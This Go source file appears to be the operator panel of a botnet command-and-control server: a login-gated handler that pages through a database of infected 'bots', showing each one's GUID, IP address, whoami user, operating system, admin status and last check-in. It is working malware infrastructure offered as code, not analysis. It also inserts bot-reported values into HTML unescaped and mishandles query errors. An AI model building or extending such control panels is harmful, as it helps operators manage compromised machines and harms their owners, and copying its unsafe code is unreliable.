/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server
//------------------------------------------------------------
import (
	"strings"
	"fmt"
	"strconv"
	"io"
	"net/http"
	"database/sql"
)
//------------------------------------------------------------
func PanelHandler(response http.ResponseWriter, request *http.Request) {
	if !isEnabled {
		return
	}
	if !isPanel {
		fmt.Fprintf(response, "404 page not found")
		return
	}
	userName := GetUserName(request)
	if userName == "" {
		fmt.Fprintf(response, LoginHTML)
		return
	}

	request.ParseForm()
	OFFSET := request.Form.Get("page")

	var top = ClientCount()
	if OFFSET == "" {
		OFFSET = "1"
	}
	offsetint, _ := strconv.Atoi(OFFSET)
	if top == 0 {
		r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No Bots in Database")
		result := r.Replace(ErrorHTML)
		fmt.Fprintf(response, result)
	} else {
		var tableRaw string
		var tmpguid, tmpip, tmpwhoami, tmpos, tmpadmin, tmplastcheck string
		rows, err := DBPointer.Query("SELECT guid, ip, whoami, os, isadmin, lastcheckin FROM clients ORDER BY id DESC LIMIT ? OFFSET ?", maxBotList, maxBotList*(offsetint-1))
		if err != nil && err != sql.ErrNoRows {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
			result := r.Replace(ErrorHTML)
			fmt.Fprintf(response, result)
		}

		for rows.Next() {
			err := rows.Scan(&tmpguid, &tmpip, &tmpwhoami, &tmpos, &tmpadmin, &tmplastcheck)

			if err != nil {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
				result := r.Replace(ErrorHTML)
				fmt.Fprintf(response, result)
			}

			var tmptableRaw string
			tmptableRaw = BotTableHTML
			r := strings.NewReplacer("{GUID}", tmpguid, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpadmin, "{LASDATE}", tmplastcheck)
			result := r.Replace(tmptableRaw)
			tableRaw += result
		}

		var s string
		if offsetint != 1 {
			s = strconv.Itoa(offsetint - 1)
		} else {
			s = strconv.Itoa(offsetint)
		}

		s1 := strconv.Itoa(offsetint + 1)

		r := strings.NewReplacer("{STATS}", createcountDiv(), "{RAWTABLE}", tableRaw, "{BACK}", s, "{NEXT}", s1)
		result := r.Replace(PanelHTML)

		rr := strings.NewReader(result)

		io.Copy(response, rr)
	}
}
//------------------------------------------------------------